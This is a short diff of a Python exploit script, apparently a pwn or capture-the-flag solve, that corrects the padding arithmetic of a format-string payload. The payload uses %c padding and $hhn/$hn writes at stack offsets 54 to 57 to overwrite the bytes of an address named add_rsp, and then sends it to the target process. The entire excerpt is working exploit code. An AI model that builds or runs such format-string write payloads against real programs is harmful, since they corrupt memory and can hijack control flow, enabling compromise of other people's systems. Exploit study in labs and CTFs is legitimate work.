@@ -253,8 +253,8 @@ add_rsp4 = int(hex(add_rsp)[2:][:2], 16)
 offset = 54
 payload = f"%{add_rsp4}c%{offset+3}" + "$hhn"
 payload += f"%{(add_rsp3 - add_rsp4)}c%{offset+2}" + "$hhn"
-payload += f"%{(add_rsp1 - (add_rsp3 + add_rsp4)) + 127}c%{offset}" + "$hn"
-payload += f"%{(add_rsp2 - (add_rsp3 + add_rsp4 + add_rsp1 + 127 - 509))}c%{offset+1}" + "$hn"
+payload += f"%{(add_rsp1 - add_rsp3)}c%{offset}" + "$hn"
+payload += f"%{(add_rsp2 - add_rsp1)}c%{offset+1}" + "$hn"
 
 p.sendline(payload)
 
